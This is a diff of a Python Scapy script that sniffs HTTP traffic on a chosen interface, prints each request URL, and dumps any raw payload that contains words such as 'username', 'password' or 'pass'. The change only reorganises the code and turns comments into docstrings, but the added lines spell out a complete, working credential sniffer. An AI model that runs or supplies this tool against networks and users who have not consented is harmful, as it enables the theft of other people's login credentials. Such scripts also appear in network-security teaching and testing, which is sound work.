@@ -7,13 +7,50 @@ import os
 
 INTERFACE = ''
 KEYWORDS = ['username', 'user', 'mail', 'password', 'pass', 'psswd']
-
 LINE = '____________________________________________'
 
-'''
-Parser of command line arguments
-'''
+
+def get_password(packet):
+    '''
+    Process each sniffed packet to evaluate if it can contain credentials
+    '''
+
+    if packet.haslayer(Raw):
+        #Decode or str() in the beginning
+        load = packet[Raw].load.decode()
+
+        #Check the presence of possible keywords for 
+        #insertion of credentials through POST request
+        for keyword in KEYWORDS:
+            if keyword in load:
+                return load
+    
+
+def analyze_pkt(packet):
+    '''
+    Process each sniffed packet
+    '''
+
+    #HTTP request
+    if packet.haslayer(HTTPRequest):
+        #Complete URL
+        url = packet[HTTPRequest].Host.decode('utf-8') + packet[HTTPRequest].Path.decode('utf-8')
+        cprint(f'{url}', 'yellow', attrs=['bold',])
+        
+        #Check if the load could contain credentials
+        load = get_password(packet)
+
+        if load:
+            print(load, end='\n\n')
+        else:
+            print("Fields not in the dictionary", end='\n\n')
+        
+
 def args_parser():
+    '''
+    Parser of command line arguments
+    '''
+
     global INTERFACE, VERBOSE
     #Parser of command line arguments
     parser = argparse.ArgumentParser()
@@ -31,43 +68,6 @@ def args_parser():
     INTERFACE = args.interface
 
 
-'''
-Process each sniffed packet to evaluate if it can contain credentials
-'''
-def get_password(packet):
-    if packet.haslayer(Raw):
-        #Decode or str() in the beginning
-        load = packet[Raw].load.decode()
-
-        #Check the presence of possible keywords for 
-        #insertion of credentials through POST request
-        for keyword in KEYWORDS:
-            if keyword in load:
-                return load
-    
-
-'''
-Process each sniffed packet
-'''
-def analyze_pkt(packet):
-    #HTTP request
-    if packet.haslayer(HTTPRequest):
-        #Complete URL
-        url = packet[HTTPRequest].Host.decode('utf-8') + packet[HTTPRequest].Path.decode('utf-8')
-        cprint(f'{url}', 'yellow', attrs=['bold',])
-        
-        #Check if the load could contain credentials
-        load = get_password(packet)
-
-        if load:
-            print(load, end='\n\n')
-        else:
-            print("Fields not in the dictionary", end='\n\n')
-        
-
-'''
-Main function
-'''
 def main():
     args_parser()
     #Detection of passwords
